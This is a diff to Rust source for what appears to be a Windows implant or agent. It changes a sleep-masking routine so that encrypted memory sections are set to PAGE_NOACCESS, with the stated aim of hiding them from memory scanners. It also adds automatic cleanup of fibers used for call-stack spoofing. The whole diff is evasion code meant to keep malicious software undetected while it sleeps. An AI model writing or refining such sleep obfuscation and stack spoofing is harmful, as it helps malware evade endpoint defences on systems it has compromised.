@@ -770,10 +770,17 @@ pub mod stack_mask {
                 );
                 cipher.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
             }
-            // Restore original protection so that page-permission bookkeeping
-            // matches OS expectations throughout the sleep window.
+            // Set PAGE_NOACCESS so that encrypted sections are completely
+            // inaccessible during the sleep window, preventing memory scanners
+            // from reading high-entropy encrypted data.  The original protection
+            // is saved in the SectionEntry and restored by decrypt_with_key().
             let mut dummy = 0u32;
-            let _ = super::crypto::protect_region(addr, size, orig_prot, &mut dummy);
+            let _ = super::crypto::protect_region(
+                addr,
+                size,
+                winapi::um::winnt::PAGE_NOACCESS,
+                &mut dummy,
+            );
             result.push(SectionEntry { addr, len: size, orig_prot, nonce });
         }
         result
@@ -904,6 +911,10 @@ pub mod spoof {
         unsafe {
             use winapi::um::winbase::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};
 
+            // Ensure the thread-local fiber guard is initialised so that
+            // cleanup_fibers() runs when this thread exits.
+            super::FIBER_GUARD.with(|_| {});
+
             LAST_SWITCH_SUCCEEDED.with(|c| c.set(false));
 
             // Only convert once per thread
@@ -991,9 +1002,36 @@ pub mod spoof {
     }
 }
 
+// ── Automatic fiber cleanup via thread-local guard ──────────────────────────
+//
+// `FIBER_GUARD` is a thread-local whose Drop impl calls `cleanup_fibers()`.
+// It is initialised the first time `spoof_stack()` runs on a given thread.
+// When that thread exits, the Rust runtime drops `FIBER_GUARD`, which in turn
+// calls `cleanup_fibers()` — releasing the fiber handles created by
+// `ConvertThreadToFiber` / `CreateFiber`.
+
+/// RAII guard that releases per-thread fiber handles on Drop.
+///
+/// Stored in a `thread_local!` so it lives for the entire lifetime of the
+/// thread.  When the thread exits, the runtime drops the guard, which calls
+/// `cleanup_fibers()` to release any fibers created by `spoof::spoof_stack`.
+struct FiberGuard;
+
+impl Drop for FiberGuard {
+    fn drop(&mut self) {
+        cleanup_fibers();
+    }
+}
+
+thread_local! {
+    /// Per-thread guard that ensures fibers are cleaned up when the thread exits.
+    /// Initialised lazily on first access (triggered by `spoof_stack()`).
+    static FIBER_GUARD: FiberGuard = const { FiberGuard };
+}
+
 /// Release any fiber handles created by `spoof::spoof_stack` for the calling
-/// thread.  Must be called before the thread exits or before the agent shuts
-/// down to avoid leaking fiber memory (H-4).
+/// thread.  Called automatically when the thread exits via `FIBER_GUARD`'s Drop
+/// impl.  Can also be called manually before shutdown if needed.
 pub fn cleanup_fibers() {
     #[cfg(windows)]
     {
